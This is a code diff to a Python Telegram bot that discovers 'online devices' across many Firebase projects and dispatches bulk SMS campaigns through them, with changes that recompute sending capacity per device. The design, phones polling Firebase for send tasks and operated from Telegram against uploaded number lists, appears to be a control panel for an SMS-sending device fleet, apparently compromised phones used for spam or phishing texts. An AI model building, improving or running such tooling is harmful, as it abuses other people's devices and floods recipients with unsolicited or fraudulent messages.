@@ -98,18 +98,23 @@ def confirm_keyboard():
 
 
 async def cmd_start(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
-    msg = await update.message.reply_text("\U0001f504 Scanning all Firebase projects for online devices…")
+    msg = await update.message.reply_text(
+        "\U0001f504 Scanning all Firebase projects for online devices…\n"
+        "_(This may take 30-60 seconds)_",
+        parse_mode="Markdown",
+    )
 
     devices = await rtdb.discover_all_devices()
     ctx.bot_data[KEY_DEVS] = devices
 
     total_projects  = len(rtdb.RTDB_URLS)
     active_projects = len({d.db_url for d in devices})
-    capacity        = active_projects * rtdb.MAX_SMS_PER_DB
+    # Capacity = devices × per-device limit (not projects × limit)
+    capacity        = len(devices) * rtdb.MAX_SMS_PER_DB
 
     lines = [
         f"\U0001f4e6 *{active_projects}/{total_projects}* projects online",
-        f"\U0001f4f1 *{len(devices)}* device(s) found",
+        f"\U0001f4f1 *{len(devices):,}* device(s) found",
         f"\U0001f680 Capacity this run: *{capacity:,}* SMS",
         "",
         "Use /send to start a campaign.",
@@ -123,11 +128,11 @@ async def cmd_send(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
         await update.message.reply_text("Run /start first to load devices.")
         return ConversationHandler.END
 
+    capacity = len(devices) * rtdb.MAX_SMS_PER_DB
     db_count = len({d.db_url for d in devices})
-    capacity = db_count * rtdb.MAX_SMS_PER_DB
     await update.message.reply_text(
         f"\U0001f4cb Send phone numbers now.\n"
-        f"Capacity: *{capacity:,}* SMS across *{db_count}* project(s)\n\n"
+        f"Capacity: *{capacity:,}* SMS across *{db_count}* project(s) / *{len(devices):,}* device(s)\n\n"
         "Options:\n"
         "  • Upload *.csv* (column: phone/mobile/number)\n"
         "  • Paste numbers one per line\n\n"
@@ -155,8 +160,7 @@ async def _store_numbers(update, ctx, valid, invalid) -> int:
         return WAIT_NUMBERS
 
     devices  = ctx.bot_data.get(KEY_DEVS, [])
-    db_count = len({d.db_url for d in devices})
-    capacity  = db_count * rtdb.MAX_SMS_PER_DB
+    capacity = len(devices) * rtdb.MAX_SMS_PER_DB
     will_send = min(len(valid), capacity)
     skipped   = len(valid) - will_send
 
@@ -189,8 +193,8 @@ async def receive_message(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int
     await update.message.reply_text(
         f"\U0001f4ca *Campaign Summary*\n\n"
         f"Recipients  : *{len(numbers):,}*\n"
-        f"Projects    : *{db_count}* Firebase DBs\n"
-        f"Per project : up to *{rtdb.MAX_SMS_PER_DB}* SMS\n"
+        f"Devices     : *{len(devices):,}* across *{db_count}* Firebase DBs\n"
+        f"Per device  : up to *{rtdb.MAX_SMS_PER_DB}* SMS\n"
         f"Msg length  : *{chars}* chars · *{segs}* segment(s)\n\n"
         f"\U0001f4dd _Message:_\n`{text[:300]}`\n\n"
         "Send?",
@@ -219,7 +223,7 @@ async def handle_confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
 
     db_count = len({d.db_url for d in devices})
     prog_msg = await q.edit_message_text(
-        f"\U0001f680 Writing *{len(numbers):,}* SMS tasks to *{db_count}* Firebase projects…",
+        f"\U0001f680 Writing *{len(numbers):,}* SMS tasks to *{len(devices):,}* device(s)…",
         parse_mode="Markdown",
     )
 
@@ -240,7 +244,6 @@ async def handle_confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
         except Exception:
             pass
 
-    # dispatch_campaign now returns (campaign_tag, task_log list)
     campaign_tag, task_log = await rtdb.dispatch_campaign(
         devices=devices,
         numbers=numbers,
@@ -277,7 +280,6 @@ async def handle_confirm(update: Update, ctx: ContextTypes.DEFAULT_TYPE) -> int:
         except Exception:
             pass
 
-    # poll_stats now takes (task_log list, campaign_tag)
     await rtdb.poll_stats(task_log, campaign_tag, update_cb=on_stat_update)
 
     ctx.user_data.clear()
